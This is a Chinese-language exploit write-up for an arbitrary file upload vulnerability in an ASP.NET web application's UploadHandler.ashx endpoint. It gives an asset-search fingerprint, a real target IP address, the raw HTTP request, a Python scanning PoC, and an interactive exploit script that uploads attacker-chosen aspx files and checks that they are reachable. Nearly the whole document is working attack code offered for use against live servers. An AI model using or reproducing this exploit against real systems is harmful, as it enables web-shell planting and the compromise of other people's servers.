## 一、资产搜索

```
body="/Assistant/Default.aspx"
```

## 二、网站测试

```
http://39.108.158.214:9003
```

## 三、验证漏洞

```
POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
Host: 39.108.158.214:9003
accept: */*
Content-Type: multipart/form-data; boundary=---------------------------123
Content-Length: 176
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: text/plain

safdsfsfaa
-----------------------------123--
```

![image-20240908160305259](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908160305259.png)

![image-20240908165937501](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908165937501.png)

## 四、POC

```
def poc(target):
    payload = "/Handler/UploadHandler.ashx?folder=Uploadfile2"
    headers = {
        "accept": "*/*",
        "Content-Type": "multipart/form-data;boundary=---------------------------123",
        "Content-Length": "174",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close"
    }
    data = """-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="1.php"
Content-Type: text/plain

123456789
-----------------------------123--
    """

    res1 = requests.get(url=target,verify=False,timeout=5)
    try:
        res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200:
            if res2.text == "1":
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"[+]{target}存在任意文件上传漏洞\n")

                    f.close()
                    print(f"[+]{target}存在任意文件上传漏洞")
                    return True
            else:
                print(f"[-]{target}不存在任意文件上传漏洞")
        else:
            print("网站访问超时，请手工测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        try:
            payload = "/Handler/UploadHandler.ashx?folder=Uploadfile2"
            headers = {
                "accept": "*/*",
                "Content-Type": "multipart/form-data;boundary=---------------------------123",
                "Content-Length": "174",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Te": "trailers",
                "Connection": "close"
            }
            filename = input("请输入要上传的文件名(仅限aspx文件):\n>>>>>>>>>>>>>>")
            file = input("请输入要上传的文件内容:\n>>>>>>>>>>>>>>")
            url = f"{target}/Handler/Uploadfile2/{filename}"
            data = f"""-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="{filename}"
Content-Type: text/plain

{file}
-----------------------------123--
                """
            proxies = {
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080"
            }
            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
            if res2.text == "1":
                res3 = requests.get(url=url,verify=False,timeout=5)
                if res3.status_code == 200 and res3.text == file:
                        print(f"文件上传成功!!!\n路径为{url}")
                        cmd = input(f"输入1继续上传文件，0退出\n>>>>>>>>>>>>>>>>>>")
                        if cmd == "0":
                            exit()
                        else:
                            pass
                else:
                    print("文件上传失败!!!")
        except Exception as e:
            print(e)
```

## 六、测试结果

![image-20240908165810830](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908165810830.png)

![image-20240908165345645](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908165345645.png)

